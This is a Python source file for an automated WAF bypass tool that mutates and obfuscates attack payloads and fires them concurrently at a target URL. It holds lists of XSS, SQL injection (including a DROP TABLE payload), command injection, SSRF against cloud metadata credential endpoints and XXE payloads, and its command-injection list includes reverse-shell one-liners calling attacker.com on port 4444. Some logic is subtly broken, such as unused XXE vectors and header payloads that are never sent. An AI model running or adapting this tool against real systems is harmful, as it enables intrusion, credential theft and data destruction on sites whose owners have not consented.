# scanners/waf_bypass_engine.py
from typing import List, Dict, Optional, Tuple, Set
import requests
import string
import random
import time
import hashlib
import base64
import urllib.parse
import re
from itertools import combinations
from concurrent.futures import ThreadPoolExecutor, as_completed


class PayloadMutator:
    
    ENCODING_METHODS = {
        'URL': lambda x: urllib.parse.quote(x),
        'DOUBLE_URL': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
        'UNICODE': lambda x: ''.join(f'%u{ord(c):04x}' for c in x),
        'HEX': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
        'BASE64': lambda x: base64.b64encode(x.encode()).decode(),
        'DOUBLE_BASE64': lambda x: base64.b64encode(base64.b64encode(x.encode()).decode().encode()).decode(),
        'HTML_ENTITY': lambda x: ''.join(f'&#{ord(c)};' for c in x),
        'HEX_HTML_ENTITY': lambda x: ''.join(f'&#x{ord(c):x};' for c in x),
        'UTF7': lambda x: x.encode('utf-7').decode(),
        'UTF8_BOM': lambda x: '\ufeff' + x,
    }
    
    OBFUSCATION_METHODS = {
        'CASE_VARIATION': lambda x: ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in x),
        'SPACE_REPLACEMENT': lambda x: x.replace(' ', '\t').replace(' ', '\n').replace(' ', '\r'),
        'NULL_BYTE': lambda x: x.replace(' ', '\x00'),
        'UNICODE_SPACE': lambda x: x.replace(' ', '\u0020'),
        'TAB_SPACE': lambda x: x.replace(' ', '\x09'),
        'NEWLINE_SPACE': lambda x: x.replace(' ', '\x0a'),
        'CARRIAGE_RETURN': lambda x: x.replace(' ', '\x0d'),
        'FORM_FEED': lambda x: x.replace(' ', '\x0c'),
        'VERTICAL_TAB': lambda x: x.replace(' ', '\x0b'),
        'COMMENT_INJECTION': lambda x: x.replace(' ', '/**/', True) if ' ' in x else x,
        'UNICODE_NORMALIZATION': lambda x: x.encode('utf-8').decode('utf-8'),
        'MIXED_CASE': lambda x: ''.join(f'{c.upper()}{c.lower()}' if c.isalpha() else c for c in x),
    }
    
    BYPASS_TECHNIQUES = {
        'CASE_INSENSITIVE': lambda x: x.lower() if random.choice([True, False]) else x.upper(),
        'DOUBLE_ENCODING': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
        'NESTED_ENCODING': lambda x: urllib.parse.quote(base64.b64encode(urllib.parse.quote(x).encode()).decode()),
        'UNICODE_ESCAPE': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
        'OCTAL_ENCODING': lambda x: ''.join(f'\\{oct(ord(c))[2:]}' for c in x),
        'ESCAPED_QUOTES': lambda x: x.replace('"', '\\"').replace("'", "\\'"),
        'BACKSLASH_ESCAPE': lambda x: '\\' + x,
        'SLASH_ESCAPE': lambda x: '/' + x,
        'VERTICAL_TAB_INJECTION': lambda x: x.replace(' ', '\x0b'),
        'ZERO_WIDTH_SPACE': lambda x: '\u200b'.join(x),
        'RIGHT_TO_LEFT_OVERRIDE': lambda x: '\u202e' + x,
        'EMOJI_INJECTION': lambda x: x + '😀',
        'UNICODE_VARIATION': lambda x: x.encode('utf-8', 'ignore').decode('utf-8'),
        'LONG_UTF8': lambda x: x.encode('utf-32').decode('utf-32', errors='ignore'),
    }
    
    @staticmethod
    def mutate_payload(payload: str, technique: str = None) -> str:
        if technique:
            if technique in PayloadMutator.ENCODING_METHODS:
                try:
                    return PayloadMutator.ENCODING_METHODS[technique](payload)
                except:
                    return payload
            elif technique in PayloadMutator.OBFUSCATION_METHODS:
                try:
                    return PayloadMutator.OBFUSCATION_METHODS[technique](payload)
                except:
                    return payload
            elif technique in PayloadMutator.BYPASS_TECHNIQUES:
                try:
                    return PayloadMutator.BYPASS_TECHNIQUES[technique](payload)
                except:
                    return payload
        
        random_technique = random.choice(list(PayloadMutator.ENCODING_METHODS.keys()))
        try:
            return PayloadMutator.ENCODING_METHODS[random_technique](payload)
        except:
            return payload
    
    @staticmethod
    def generate_polyglot_payload(base_payload: str) -> List[str]:
        variations = [base_payload]
        
        for encoding in PayloadMutator.ENCODING_METHODS.keys():
            try:
                variations.append(PayloadMutator.ENCODING_METHODS[encoding](base_payload))
            except:
                pass
        
        for obfuscation in PayloadMutator.OBFUSCATION_METHODS.keys():
            try:
                variations.append(PayloadMutator.OBFUSCATION_METHODS[obfuscation](base_payload))
            except:
                pass
        
        for bypass in PayloadMutator.BYPASS_TECHNIQUES.keys():
            try:
                variations.append(PayloadMutator.BYPASS_TECHNIQUES[bypass](base_payload))
            except:
                pass
        
        return list(set(variations))


class IntelligentPayloadGenerator:
    
    XSS_VECTORS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe onload=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<button onclick=alert(1)>',
        '<form action=javascript:alert(1)>',
        '<embed src=javascript:alert(1)>',
        '<object data=javascript:alert(1)>',
        '<frameset onload=alert(1)>',
        '<base href=javascript:alert(1)>',
        '<link rel=stylesheet href=javascript:alert(1)>',
        '<meta http-equiv=refresh content="0;url=javascript:alert(1)">',
        '<style>@import url(javascript:alert(1));</style>',
        '<table background=javascript:alert(1)>',
        '<tr><td background=javascript:alert(1)>',
    ]
    
    SQLI_VECTORS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' OR 'a'='a",
        "1' AND '1'='1",
        "1' UNION SELECT NULL,NULL--",
        "admin' --",
        "admin'#",
        "' or 1=1 /*",
        "' or 1=1 #",
        "' or 1=1 -- -",
        "' UNION ALL SELECT NULL--",
        "1' UNION SELECT version()--",
        "1' AND SLEEP(5)--",
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
        "' UNION SELECT database()--",
    ]
    
    RCE_VECTORS = [
        '`id`',
        '$(id)',
        '| id',
        '; id;',
        '&& id',
        '|| id',
        '| cat /etc/passwd',
        '`whoami`',
        '$(whoami)',
        '; whoami;',
        '`nc -e /bin/sh attacker.com 4444`',
        '$(python -c "import socket,subprocess;s=socket.socket();s.connect((\'attacker.com\',4444));subprocess.call([\'/bin/sh\',\'-i\'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())")',
    ]
    
    XXSSRF_VECTORS = [
        'http://127.0.0.1:8080',
        'http://169.254.169.254/latest/meta-data/',
        'http://localhost:3000',
        'file:///etc/passwd',
        'gopher://127.0.0.1:9000',
        'dict://127.0.0.1:11211',
        'sftp://127.0.0.1:22',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.170.2/latest/api/token',
    ]
    
    XXE_VECTORS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    ]
    
    POLYGLOT_PAYLOADS = [
        "jaVasCript:/**/alert(1)",
        "'><script>alert(1)</script>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<svg/onload=alert('xss')>",
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
        "\"onmouseover=alert('XSS')",
        "<marquee onstart=alert(1)>",
        "</title><img src=x onerror=alert(1)>",
    ]
    
    @staticmethod
    def generate_intelligent_payloads(vector_type: str, target_context: str = '') -> List[str]:
        payloads = []
        
        if vector_type.upper() == 'XSS':
            base_vectors = IntelligentPayloadGenerator.XSS_VECTORS
        elif vector_type.upper() == 'SQLI':
            base_vectors = IntelligentPayloadGenerator.SQLI_VECTORS
        elif vector_type.upper() == 'RCE':
            base_vectors = IntelligentPayloadGenerator.RCE_VECTORS
        elif vector_type.upper() in ['SSRF', 'XXE']:
            base_vectors = IntelligentPayloadGenerator.XXSSRF_VECTORS
        else:
            base_vectors = IntelligentPayloadGenerator.POLYGLOT_PAYLOADS
        
        for vector in base_vectors:
            mutated_variations = PayloadMutator.generate_polyglot_payload(vector)
            payloads.extend(mutated_variations)
        
        polyglot_mutated = PayloadMutator.generate_polyglot_payload(random.choice(IntelligentPayloadGenerator.POLYGLOT_PAYLOADS))
        payloads.extend(polyglot_mutated)
        
        for i in range(50):
            random_vector = random.choice(base_vectors)
            mutation_chain = random_vector
            
            for _ in range(random.randint(1, 3)):
                technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.keys()))
                mutation_chain = PayloadMutator.mutate_payload(mutation_chain, technique)
            
            payloads.append(mutation_chain)
        
        return list(set(payloads))[:200]


class WAFDetector:
    
    WAF_SIGNATURES = {
        'CloudFlare': ['cf-ray', 'cf-cache-status', '__cfruid'],
        'AWS WAF': ['x-amzn-requestid', 'x-amzn-errortype'],
        'Imperva': ['x-iinfo', 'x-protected-by', 'imperva'],
        'F5 BIG-IP': ['x-lb', 'bigipserverid', 'X-Forwarded-Server'],
        'Barracuda': ['x-barracuda', 'barracuda_enforcer_uuid'],
        'ModSecurity': ['modsecurity'],
        'Akamai': ['akamai-origin-hop', 'akamai-request-id'],
        'AWS Shield': ['x-amzn-waf'],
        'DDoS-GUARD': ['ddos-guard'],
        'Sucuri': ['sucuri'],
        'Cloudflare': ['server: cloudflare'],
        'Fortinet FortiWeb': ['fortinet'],
        'Citrix NetScaler': ['citrix', 'netscaler'],
    }
    
    @staticmethod
    def detect_waf(target_url: str, timeout: int = 10) -> Tuple[str, float]:
        try:
            response = requests.get(target_url, timeout=timeout, verify=False)
            
            headers = response.headers
            content = response.text.lower()
            
            detected_wafs = []
            
            for waf, signatures in WAFDetector.WAF_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in str(headers).lower() or sig.lower() in content:
                        detected_wafs.append((waf, 0.9))
                        break
            
            if response.status_code == 403 or response.status_code == 406:
                detected_wafs.append(('Generic WAF', 0.5))
            
            if detected_wafs:
                return detected_wafs[0]
            
            return ('No WAF Detected', 0.0)
            
        except Exception:
            return ('Unknown', 0.5)


class WAFBypassEngine:
    
    def __init__(self, target_url: str, timeout: int = 10, max_workers: int = 30):
        self.target_url = target_url
        self.timeout = timeout
        self.max_workers = max_workers
        self.session = self._create_session()
        self.bypass_history = []
        self.successful_techniques = []
        self.response_baseline = None
        self.waf_type = None
        self.waf_confidence = 0.0
        self.bypass_count = 0
        self.total_attempts = 0
    
    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        return session
    
    def detect_waf(self) -> Tuple[str, float]:
        self.waf_type, self.waf_confidence = WAFDetector.detect_waf(self.target_url, self.timeout)
        return self.waf_type, self.waf_confidence
    
    def get_baseline_response(self) -> Optional[Dict]:
        try:
            response = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            
            self.response_baseline = {
                'status_code': response.status_code,
                'content_length': len(response.content),
                'content_hash': hashlib.sha256(response.content).hexdigest(),
                'response_time': response.elapsed.total_seconds(),
                'headers': dict(response.headers),
            }
            
            return self.response_baseline
            
        except Exception:
            return None
    
    def test_payload(self, payload: str, injection_point: str = 'query') -> Dict:
        self.total_attempts += 1
        
        result = {
            'payload': payload,
            'injection_point': injection_point,
            'is_bypassed': False,
            'confidence': 0.0,
            'response_status': None,
            'response_time': 0.0,
            'is_blocked': False,
            'detection_signals': [],
            'technique_used': '',
        }
        
        try:
            if injection_point == 'query':
                test_url = f"{self.target_url}?payload={payload}"
            elif injection_point == 'path':
                test_url = f"{self.target_url}/{payload}"
            elif injection_point == 'header':
                headers = self.session.headers.copy()
                headers['X-Forwarded-For'] = payload
                test_url = self.target_url
            else:
                test_url = self.target_url
            
            start_time = time.time()
            response = self.session.get(test_url, timeout=self.timeout, verify=False)
            response_time = time.time() - start_time
            
            result['response_status'] = response.status_code
            result['response_time'] = response_time
            
            blocked_status_codes = [403, 406, 429, 444]
            blocked_keywords = ['blocked', 'denied', 'forbidden', 'attacked', 'suspended', 'access denied']
            
            if response.status_code in blocked_status_codes:
                result['is_blocked'] = True
                result['detection_signals'].append(f'Blocked status code: {response.status_code}')
            
            if any(keyword in response.text.lower() for keyword in blocked_keywords):
                result['is_blocked'] = True
                result['detection_signals'].append('Blocked keyword detected')
            
            if self.response_baseline:
                if abs(len(response.content) - self.response_baseline['content_length']) > 500:
                    result['detection_signals'].append('Response size differs significantly')
                
                if response.elapsed.total_seconds() > self.response_baseline['response_time'] * 2:
                    result['detection_signals'].append('Response time increased')
            
            if not result['is_blocked']:
                result['is_bypassed'] = True
                result['confidence'] = self._calculate_bypass_confidence(result)
                self.bypass_count += 1
            
            return result
            
        except requests.Timeout:
            result['detection_signals'].append('Request timeout - possible detection')
            result['is_blocked'] = True
            return result
        except Exception as e:
            result['detection_signals'].append(f'Error: {str(e)}')
            return result
    
    def _calculate_bypass_confidence(self, result: Dict) -> float:
        confidence = 0.8
        
        if result['response_status'] == 200:
            confidence += 0.15
        
        if not result['detection_signals']:
            confidence += 0.05
        
        return min(confidence, 1.0)
    
    def adaptive_bypass(self, vector_type: str = 'XSS', max_iterations: int = 500) -> List[Dict]:
        successful_bypasses = []
        
        self.detect_waf()
        self.get_baseline_response()
        
        payloads = IntelligentPayloadGenerator.generate_intelligent_payloads(vector_type)
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {}
            
            for i, payload in enumerate(payloads[:max_iterations]):
                injection_points = ['query', 'path']
                
                for injection_point in injection_points:
                    future = executor.submit(self.test_payload, payload, injection_point)
                    futures[future] = (payload, injection_point)
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    
                    if result['is_bypassed']:
                        successful_bypasses.append(result)
                        self.successful_techniques.append({
                            'payload': result['payload'],
                            'injection_point': result['injection_point'],
                            'confidence': result['confidence'],
                            'waf_type': self.waf_type,
                        })
                        
                        if len(successful_bypasses) >= 10:
                            break
                    
                except Exception:
                    continue
        
        return sorted(successful_bypasses, key=lambda x: x['confidence'], reverse=True)
    
    def generate_custom_payload(self, base_payload: str, obfuscation_level: int = 3) -> List[str]:
        payloads = []
        
        current_payload = base_payload
        for _ in range(obfuscation_level):
            for technique in PayloadMutator.BYPASS_TECHNIQUES.keys():
                try:
                    mutated = PayloadMutator.mutate_payload(current_payload, technique)
                    payloads.append(mutated)
                except:
                    pass
        
        return list(set(payloads))
    
    def get_bypass_report(self) -> Dict:
        return {
            'target': self.target_url,
            'waf_type': self.waf_type,
            'waf_confidence': self.waf_confidence,
            'total_attempts': self.total_attempts,
            'successful_bypasses': self.bypass_count,
            'bypass_rate': (self.bypass_count / max(self.total_attempts, 1)) * 100,
            'successful_techniques': self.successful_techniques,
            'bypass_history': self.bypass_history,
        }
